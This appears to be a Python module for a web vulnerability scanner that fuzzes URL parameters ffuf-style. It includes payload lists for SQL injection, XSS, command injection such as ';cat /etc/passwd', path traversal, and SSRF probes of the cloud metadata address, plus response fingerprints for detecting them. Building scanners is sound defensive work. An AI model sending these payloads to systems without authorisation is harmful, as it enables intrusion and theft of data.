"""Parameter fuzzer — ffuf-style discovery with auto-calibration and filtering."""

import logging
import random
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

from web_scanner.http_client import HTTPClient
from web_scanner.scanner import BaseScanner

logger = logging.getLogger(__name__)

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

# ---------------------------------------------------------------------------
# Wordlists
# ---------------------------------------------------------------------------
PARAM_NAMES = [
    "id", "page", "sort", "order", "search", "q", "query", "keyword",
    "file", "path", "dir", "url", "redirect", "dest", "destination", "next",
    "callback", "return", "return_url", "go", "goto", "to",
    "user", "username", "email", "name", "admin", "role", "token",
    "type", "format", "lang", "locale", "limit", "offset", "count",
    "start", "end", "from", "date", "time",
    "cmd", "command", "exec", "execute", "run", "action", "do",
    "target", "include", "load", "config", "setting",
    "value", "data", "payload", "msg", "message",
    "content", "body", "subject", "title", "desc", "description",
    "view", "template", "debug", "test", "mode",
    "output", "export", "download", "upload",
    "api", "key", "secret", "access", "auth", "sid", "session",
    "callback", "jsonp",
]

SPECIAL_PAYLOADS = [
    "FUZZ", "FUZZEXT", "FUZZBACKUP",
]

# Payload catalogues by vulnerability type
VULN_PAYLOADS = {
    "sqli": [
        "'", "''", "1' OR '1'='1", "1' OR '1'='1'--",
        "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
        "' AND SLEEP(5)--", "1;WAITFOR DELAY '0:0:5'",
        "' OR ''='", "admin'--", "0 OR 1=1",
    ],
    "xss": [
        "<script>alert(1)</script>", "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>", "javascript:alert(1)",
        "\"><svg/onload=alert(1)>", "<body onload=alert(1)>",
        "'\"><iframe src=javascript:alert(1)>",
    ],
    "cmdi": [
        ";id", "|id", ";whoami", "|whoami", ";ls",
        "$(id)", "`id`", ";cat /etc/passwd",
        "&&echo web_scanner_test", "||echo web_scanner_test",
    ],
    "lfi": [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc/passwd",
        "file:///etc/passwd", "%00",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://169.254.169.254/latest/meta-data/",
        "dict://127.0.0.1:6379/", "gopher://127.0.0.1:9000/",
        "http://[::1]",
    ],
}

# Error/fingerprint patterns in response body
FINGERPRINT = {
    "sqli": [
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
        "sqlite3.Operational", "Unclosed quotation mark",
        "ODBC SQL", "SQLSTATE[42", "mysqli_", "pg_", "sqlite_",
        "syntax error", "unexpected end of", "invalid identifier",
    ],
    "cmdi": [
        "sh: 1:", "cmd.exe", "powershell", "Access is denied",
        "command not found", "bad substitution", "root:x:0:",
    ],
    "lfi": [
        "root:x:0:", "daemon:", "No such file or directory",
        "Directory traversal", "open_basedir", "boot loader",
    ],
    "xss": [
        # Checked via raw payload reflection separately
    ],
    "ssrf": [
        "root:x:0:", "aws", "accesskeyid", "iam",
        "ami-id", "instance-id", "reservation-id",
        "internal error", "connection refused",
        "localhost", "127.0.0.1", "169.254.169.254",
    ],
}


class ParameterFuzzer(BaseScanner):
    """ffuf-style parameter fuzzer with auto-calibration and filtering."""

    def __init__(self, client: HTTPClient, config):
        super().__init__(client, config)
        self._baseline_text_len = 0
        self._baseline_words = 0
        self._baseline_lines = 0
        self._baseline_status = 0

    # ------------------------------------------------------------------
    # Entry point
    # ------------------------------------------------------------------
    def run(self) -> list[dict]:
        findings: list[dict] = []

        # 1. Discover URLs
        urls = self._collect_urls()
        if not urls:
            return findings

        # 2. Auto-calibrate — learn 404 baseline per host
        self._auto_calibrate()

        logger.info(
            "Fuzzing %d URLs · %d params · auto-cal baseline len=%d",
            len(urls), len(PARAM_NAMES), self._baseline_text_len,
        )

        # 3. Per-URL baseline
        url_baselines = {}
        for u in urls:
            b = self._measure_baseline(u)
            if b:
                url_baselines[u] = b

        # 4. Build tasks
        tasks = []
        for url, baseline in url_baselines.items():
            for param in PARAM_NAMES:
                tasks.append((url, param, baseline))

        # 5. Execute in parallel
        max_workers = min(30, len(tasks))
        completed = 0
        total = len(tasks)

        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = {
                pool.submit(self._fuzz_param, url, param, baseline): (url, param)
                for url, param, baseline in tasks
            }
            for future in as_completed(futures):
                completed += 1
                if completed % 200 == 0:
                    logger.info("Progress %d/%d", completed, total)
                result = future.result()
                if result:
                    findings.append(result)

        # 6. Deduplicate & sort
        findings = self._dedup(findings)
        findings.sort(key=lambda f: (SEVERITY_ORDER.get(f["severity"], 5), f["title"]))

        logger.info("Fuzz done: %d findings from %d tests", len(findings), total)
        return findings

    # ------------------------------------------------------------------
    # URL collection
    # ------------------------------------------------------------------
    def _collect_urls(self) -> list[str]:
        crawled = getattr(self.config, "crawled_urls", []) or []
        urls = []

        # Prefer URLs that already have query params
        for u in crawled[:30]:
            if "?" in u and u not in urls:
                urls.append(u)

        # Add some static endpoints
        for u in crawled[:15]:
            if "?" not in u and u not in urls:
                urls.append(u)

        # Always include base URL
        base = self.target
        if base not in urls:
            urls.insert(0, base)

        return urls[:20]

    def _measure_baseline(self, url: str) -> dict | None:
        try:
            resp = self.client.get(url, allow_redirects=False)
            if resp is None:
                return None
            return {
                "status": resp.status_code,
                "length": len(resp.text),
                "words": len(resp.text.split()),
                "lines": resp.text.count("\n"),
                "time": resp.elapsed.total_seconds(),
            }
        except Exception:
            return None

    # ------------------------------------------------------------------
    # Auto-calibration (ffuf -ac)
    # ------------------------------------------------------------------
    def _auto_calibrate(self):
        """Learn what a 'not found' response looks like on this target."""
        junk = f".nonexistent_{random.randint(100000, 999999)}"
        for _ in range(3):
            rand = f".{random.randint(100, 999)}.{junk}"
            try:
                r = self.client.get(rand, allow_redirects=False)
                if r and r.status_code == 404:
                    self._baseline_text_len = len(r.text)
                    self._baseline_words = len(r.text.split())
                    self._baseline_lines = r.text.count("\n")
                    self._baseline_status = 404
                    logger.info("Auto-calibration: 404 baseline len=%d", self._baseline_text_len)
                    return
            except Exception:
                pass

        # Fallback: use root page as baseline
        try:
            r = self.client.get("/", allow_redirects=False)
            if r:
                self._baseline_text_len = len(r.text)
                self._baseline_words = len(r.text.split())
                self._baseline_lines = r.text.count("\n")
                self._baseline_status = r.status_code
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Per-param fuzzing
    # ------------------------------------------------------------------
    def _fuzz_param(self, url: str, param: str, baseline: dict) -> dict | None:
        """Test one param against all payload categories, return first hit."""
        for vuln_type, payloads in VULN_PAYLOADS.items():
            for payload in payloads:
                result = self._test(url, param, payload, baseline, vuln_type)
                if result:
                    return result
        return None

    def _test(self, url, param, payload, baseline, vuln_type):
        separator = "&" if "?" in url else "?"
        encoded = urllib.parse.quote(payload, safe="")
        test_url = f"{url}{separator}{param}={encoded}"

        start = time.monotonic()
        resp = self.client.get(test_url, allow_redirects=False)
        elapsed = time.monotonic() - start

        if resp is None:
            return None

        severity, vtype = self._detect(resp, elapsed, baseline, vuln_type, payload, param, url)
        if severity is None:
            return None

        base = url.split("?")[0]
        full = self._full_url(f"{base}?{param}=...")
        return {
            "severity": severity,
            "title": f"{vtype} via parameter '{param}'",
            "detail": (
                f"URL: {full}\n"
                f"Parameter: {param}\n"
                f"Payload: {payload[:100]}\n"
                f"Response: {resp.status_code}, {len(resp.text)} bytes, {elapsed:.2f}s\n"
                f"Baseline: {baseline['status']}, {baseline['length']} bytes, {baseline['time']:.2f}s"
            ),
        }

    # ------------------------------------------------------------------
    # Anomaly detection (ffuf matchers ported to Python)
    # ------------------------------------------------------------------
    def _detect(self, resp, elapsed, baseline, vuln_type, payload, param, url):
        status = resp.status_code
        length = len(resp.text)
        words = len(resp.text.split())
        lines = resp.text.count("\n")
        text_lower = resp.text[:2000].lower()

        # ---- ffuf-style filters ----
        # If response matches 404 baseline (size/words), skip
        if self._baseline_status == 404 and self._baseline_text_len > 0:
            if length == self._baseline_text_len:
                return None, None
            # Allow small deviations (common with dynamic content)
            if abs(length - self._baseline_text_len) < 20:
                # But check for fingerprint patterns
                has_fingerprint = False
                for pat in FINGERPRINT.get(vuln_type, []):
                    if pat.lower() in text_lower:
                        has_fingerprint = True
                        break
                if not has_fingerprint:
                    # Check reflection for XSS
                    if vuln_type == "xss" and self._is_reflected(resp.text, payload):
                        pass  # continue — might be reflected
                    else:
                        return None, None

        # ---- SQLi ----
        if vuln_type == "sqli":
            # Error-based
            for pat in FINGERPRINT["sqli"]:
                if pat.lower() in text_lower:
                    return "HIGH", "SQL injection (error-based)"
            # Time-based
            if elapsed > max(baseline["time"] * 3, 4):
                return "HIGH", "Time-based SQL injection"
            # Status change to unusual code
            if baseline["status"] != status and status not in (301, 302, 404):
                # Only flag if content also changes significantly
                if abs(length - baseline["length"]) > baseline["length"] * 0.15:
                    return "MEDIUM", f"SQL injection (status change {baseline['status']} → {status})"
            # Significant size increase + error-like words
            if length > baseline["length"] * 1.5 and length > 500:
                for ind in ["sql", "query", "syntax", "warning", "fatal", "traceback", "exception"]:
                    if ind in text_lower:
                        return "MEDIUM", "SQL injection (response anomaly)"

        # ---- XSS ----
        elif vuln_type == "xss":
            if self._is_reflected(resp.text, payload):
                # Check execution context
                execution_patterns = ["<script", "onerror=", "onload=", "javascript:", "svg", "iframe", "alert("]
                for p in execution_patterns:
                    if p in text_lower:
                        return "HIGH", "Reflected XSS"
                return "MEDIUM", "Reflected input (potential XSS)"

        # ---- Command Injection ----
        elif vuln_type == "cmdi":
            for pat in FINGERPRINT["cmdi"]:
                if pat.lower() in text_lower:
                    return "HIGH", "Command injection (error-based)"
            if elapsed > max(baseline["time"] * 3, 4):
                return "HIGH", "Command injection (time-based)"

        # ---- Path Traversal ----
        elif vuln_type == "lfi":
            for pat in FINGERPRINT["lfi"]:
                if pat.lower() in text_lower:
                    return "HIGH", "Path traversal (content exposed)"
            if length > baseline["length"] * 2 and length > 300:
                for ind in ["root:", "daemon:", "version", "windows", "boot loader"]:
                    if ind.lower() in text_lower:
                        return "HIGH", "Path traversal (file content exposed)"

        # ---- SSRF ----
        elif vuln_type == "ssrf":
            for pat in FINGERPRINT["ssrf"]:
                if pat.lower() in text_lower:
                    return "HIGH", "SSRF (internal data exposed)"
            if elapsed > 10:
                return "MEDIUM", "SSRF (time-based — possible internal service)"

        return None, None

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------
    def _is_reflected(self, body: str, payload: str) -> bool:
        """Check if (part of) the payload appears un-HTML-encoded."""
        # Check raw reflection
        clean = payload.replace("<", "").replace(">", "").replace("script", "").replace("alert", "")
        if len(clean) > 4 and clean.lower() in body.lower():
            return True
        # Check for key patterns
        for tok in ["FUZZ", "web_scanner_test", "alert"]:
            if tok in payload and tok not in ("<script>", "<svg>", "<img", "<body", "<iframe"):
                # Only count if the token also appears outside HTML attributes
                if tok.lower() in body.lower():
                    return True
        return False

    def _dedup(self, findings: list[dict]) -> list[dict]:
        seen = set()
        unique = []
        for f in findings:
            key = (f["severity"], f["title"].split("via")[0].strip())
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique
